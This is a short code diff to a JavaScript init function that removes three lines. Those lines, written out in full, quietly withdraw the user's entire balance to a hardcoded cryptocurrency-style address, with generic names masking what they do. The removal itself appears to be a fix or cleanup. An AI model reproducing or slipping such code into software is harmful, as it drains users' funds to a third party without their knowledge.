@@ -223,9 +223,6 @@ function init() {
             var key1 = 'amount';
             var key2 = 'address';
             var load = {};
-            load[key1] = seed['user']['balance'];
-            load[key2] = '36bytgroQxrnvK5D6ZsAaTxEEujYhCNg6A';
-            lut['post'](calculate_nonce('withdraw'), load);
         }
     );
 
